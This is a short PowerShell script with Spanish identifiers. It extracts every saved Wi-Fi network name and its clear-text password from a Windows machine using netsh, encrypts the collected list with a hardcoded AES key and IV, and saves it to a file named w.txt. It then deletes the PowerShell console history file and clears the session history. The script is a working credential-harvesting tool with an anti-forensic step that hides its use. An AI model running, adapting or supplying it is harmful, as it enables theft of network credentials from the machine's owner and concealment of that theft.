$clave = "AnyPass:)"
$iv    = "1234567890ABCDEF"

function Cifrar-Texto {
    param (
        [string]$TextoClaro,
        [string]$Clave,
        [string]$IV
    )
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = [Text.Encoding]::UTF8.GetBytes($Clave.PadRight(32, 'X'))
    $aes.IV  = [Text.Encoding]::UTF8.GetBytes($IV)
    $encryptor = $aes.CreateEncryptor($aes.Key, $aes.IV)
    $ms = New-Object IO.MemoryStream
    $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
    $sw = New-Object IO.StreamWriter($cs)
    $sw.Write($TextoClaro)
    $sw.Close()
    return [Convert]::ToBase64String($ms.ToArray())
}

$wifiList = netsh wlan show profiles | Select-String "Perfil de todos los usuarios" | ForEach-Object {
    ($_ -split ":")[1].Trim()
}

$resultado = ""
foreach ($wifi in $wifiList) {
    $details = netsh wlan show profile name="$wifi" key=clear
    $password = ($details | Select-String "Contenido de la clave" | ForEach-Object {
        ($_ -split ":")[1].Trim()
    }) -join ""
    if (-not $password) { $password = "[3rr0r]" }
    $resultado += "ss1d: $wifi`nk3y: $password`n`n"
}

$cifrado = Cifrar-Texto $resultado $clave $iv

$directorioActual = (Get-Location).Path
$rutaArchivo = Join-Path -Path $directorioActual -ChildPath "w.txt"
Set-Content -Path $rutaArchivo -Value $cifrado -Encoding UTF8

Write-Host "saved on: $rutaArchivo" -ForegroundColor Green

$histFile = Join-Path $env:APPDATA "Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
if (Test-Path $histFile) {
    Remove-Item $histFile -Force
}
Clear-History
